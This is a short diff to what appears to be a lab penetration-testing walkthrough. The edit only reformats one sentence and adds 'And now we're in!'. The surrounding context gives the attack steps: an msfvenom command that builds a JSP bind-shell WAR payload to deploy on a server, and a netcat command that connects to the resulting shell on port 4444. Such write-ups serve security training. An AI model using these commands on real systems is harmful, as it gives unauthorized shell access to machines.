@@ -180,9 +180,13 @@ First well use msf to generate a payload.
 
       msfvenom -p java/jsp_shell_bind_tcp LPORT=4444 -f war > file.war
 
-Now we can upload and deploy file.war, if successful, it will bind a shell on port 4444. After it is added to the "Applications" table, click on the path "/file". Once the wepage has loaded run this command to connect to the shell: 
+Now we can upload and deploy file.war, if successful, it will bind a shell on port 4444.
+
+After it is added to the "Applications" table, click on the path "/file". Once the wepage has loaded run this command to connect to the shell: 
 
       nc -nv 172.16.1.11 4444
+
+- And now we're in!
 
 To get the hostname run:
 
